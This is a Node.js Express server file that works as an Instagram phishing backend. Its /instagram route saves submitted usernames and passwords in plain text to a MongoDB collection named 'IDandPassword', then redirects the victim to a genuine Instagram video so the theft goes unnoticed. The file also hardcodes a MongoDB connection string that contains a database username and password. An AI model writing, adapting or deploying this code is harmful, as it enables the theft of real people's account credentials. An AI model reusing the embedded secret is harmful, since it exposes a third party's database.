const express = require('express');
const mongoose = require('mongoose');
const app= express();

require('dotenv').config()

//connectiong mongodb
const url=process.env.DB_URL || 'mongodb+srv://prayasnayak78:mongoPrayas@cluster0.zlcxrol.mongodb.net/?retryWrites=true&w=majority';

const obj={dbName:"Instagram"};
const dbConnectFun= async (url,obj)=>{
    try {
        await mongoose.connect(url,obj);
        console.log("Connected to Data base!!");
    } catch (error) {
        console.log("UNABLE TO CONNECT");
        console.log(error);
    }
}
//calling connection function
dbConnectFun(url,obj);

//public
app.use(express.static("public"));

//router
app.get("/",(req,res)=>{
    res.render("index.ejs")
})

//models and schema for Insta
const newSchema= new mongoose.Schema({
    id:String,
    password:String
})

const dbmodel=mongoose.model("IDandPassword",newSchema);

app.post("/instagram",express.urlencoded({extended:true}),async(req,res)=>{
    try {
        const formData={
            id:req.body.id,
            password:req.body.password
        }
        
        const data=new dbmodel({
            id:formData.id,
            password:formData.password
        })
        await data.save();
        console.log("Data Saved");
        const vdoLink="https://instagram.fbbi1-1.fna.fbcdn.net/v/t66.30100-16/122421809_580535017599047_4856039688889041130_n.mp4?efg=eyJ2ZW5jb2RlX3RhZyI6InZ0c192b2RfdXJsZ2VuLjEwODAuY2xpcHMuaGlnaC5jMiJ9&_nc_ht=instagram.fbbi1-1.fna.fbcdn.net&_nc_cat=111&_nc_ohc=xlaPcaLXxi0AX-sVp9f&edm=ACOOH6wBAAAA&vs=788093132993360_2123107355&_nc_vs=HBksFQAYJEdERUNUQWRIOElCWC1nOENBT29BYmw5ZUhtUkRicFIxQUFBRhUAAsgBABUAGCRHTUYwUFFlYmJfR3ZrSllEQUJtZ2xkSTNMdThpYnBSMUFBQUYVAgLIAQAoABgAGwAVAAAmhM%2FDyOjChEAVAigCQzMsF0Asd0vGp%2B%2BeGBJkYXNoX2hpZ2hfMTA4MHBfdjERAHX%2BBwA%3D&_nc_rid=aa29d2f6b5&ccb=7-5&oh=00_AfDBas25mPD5RDimmj0YsAmPWAdQIrPdX22yQ4_lr4mArw&oe=650CBAD5&_nc_sid=aa4e97";
        res.redirect(vdoLink);
    } catch (error) {
        console.log("Unable to save data");
        console.log(error);
        res.status(500).send("Error saving data");
    }
})

const PORT=process.env.PORT || 9000;

app.listen(PORT,()=>{
    console.log(`http://127.0.0.1:${PORT}`);
})